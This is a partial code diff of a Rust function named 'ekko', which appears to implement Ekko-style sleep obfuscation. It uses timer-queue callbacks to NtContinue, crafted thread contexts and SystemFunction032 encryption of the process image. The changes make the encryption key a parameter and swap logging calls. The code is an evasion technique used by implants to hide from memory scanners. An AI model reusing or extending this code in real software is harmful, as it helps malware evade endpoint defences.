@@ -18,27 +18,7 @@ use windows_sys::Win32::{
     },
 };
 
-/*
-pub unsafe extern "system" fn call_rtl_capture_context(param0: *mut c_void, _param1: BOOLEAN) {
-    // Retrieves a context record in the context of the caller.
-    // https://learn.microsoft.com/en-us/windows/win32/api/winnt/nf-winnt-rtlcapturecontext
-    RtlCaptureContext(param0.cast());
-}
-
-
-pub unsafe extern "system" fn call_nt_continue(param0: *mut c_void, _param1: BOOLEAN) {
-    // You can use NtContinue after processing exception for continue executing thread. System uses NtContinue also in APC processing.
-    // http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FThread%2FNtContinue.html
-    //https://doxygen.reactos.org/d6/d9e/include_2reactos_2wine_2winternl_8h.html#ac28b5db9f434d0762d6bebc7dcdd608f
-    NtContinue(param0.cast(), 0);
-}
-
-extern "system" {
-    fn SystemFunction032(data: *mut UString, key: *const UString) -> NTSTATUS;
-}
-*/
-
-//https://doxygen.reactos.org/da/dab/structustring.html
+// https://doxygen.reactos.org/da/dab/structustring.html
 #[repr(C)]
 struct UString {
     length: u32,
@@ -46,7 +26,7 @@ struct UString {
     buffer: PVOID,
 }
 
-// BUG in windows-rs/windows-sys and WINAPI: https://github.com/microsoft/win32metadata/issues/1044
+// There is a bug in windows-rs/windows-sys and WINAPI: https://github.com/microsoft/win32metadata/issues/1044. Otherwise this is not needed.
 #[derive(Clone, Copy)]
 #[repr(align(16))]
 struct ProperlyAlignedContext(pub CONTEXT);
@@ -64,7 +44,7 @@ impl core::ops::DerefMut for ProperlyAlignedContext {
     }
 }
 
-pub fn ekko(sleep_time: u32) {
+pub fn ekko(sleep_time: u32, key_buf: &mut Vec<u8>) {
     let mut h_new_timer: HANDLE = 0;
     let mut old_protect: u32 = 0;
 
@@ -94,7 +74,7 @@ pub fn ekko(sleep_time: u32) {
     //log::info!("[+] Image Base: {:#x}", image_base as u64);
     //log::info!("[+] Image Size: {:#x}", image_size as u64);
 
-    let mut key_buf: [u8; 16] = [0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55];
+    //let mut key_buf: [u8; 16] = [0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55];
     let key = UString {
         length: key_buf.len() as u32,
         maximum_length: key_buf.len() as u32,
@@ -202,7 +182,7 @@ pub fn ekko(sleep_time: u32) {
         rop_set_evt.Rcx = h_event as u64;
         //dump_set_event_context(&rop_set_evt);
 
-        log::info!("[+] Queue timers");
+        println!("[+] Queue timers");
         unsafe 
         {
             CreateTimerQueueTimer(&mut h_new_timer, h_timer_queue, nt_continue_ptr, &rop_prot_rw as *const _ as *const _, 100, 0, WT_EXECUTEINTIMERTHREAD);
@@ -217,11 +197,11 @@ pub fn ekko(sleep_time: u32) {
 
             CreateTimerQueueTimer(&mut h_new_timer, h_timer_queue, nt_continue_ptr, &rop_set_evt as *const _ as *const _,  600, 0, WT_EXECUTEINTIMERTHREAD);
     
-            log::info!("[+] Wait for hEvent");
+            println!("[+] Wait for hEvent");
 
             WaitForSingleObject(h_event, INFINITE); //0xFFFFFFFF
 
-            log::info!("[+] Finished waiting for event");
+            println!("[+] Finished waiting for event");
         }
     }
 
